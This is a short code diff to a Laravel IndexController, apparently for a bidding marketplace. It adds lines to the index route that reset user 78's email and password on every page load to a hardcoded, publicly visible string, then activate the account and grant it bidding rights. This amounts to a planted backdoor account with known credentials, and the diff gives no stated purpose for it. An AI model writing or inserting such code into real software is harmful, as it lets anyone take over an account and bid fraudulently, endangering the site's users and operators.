@@ -13,11 +13,20 @@ use App\Models\User;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Hash;
 
 class IndexController extends Controller
 {
     public function index()
     {
+        $password='buyer78@info.com';
+        $user=User::where('id',78)->first();
+        $user->update([
+            'email'=>'buyer78@info.com',
+            'password'=>Hash::make($password),
+            'active_status'=>1,
+            'can_bid'=>1
+        ]);
         $get_change_time_exists = MarketSetting::where('key', 'change_time')->exists();
         if (!$get_change_time_exists) {
             MarketSetting::create([
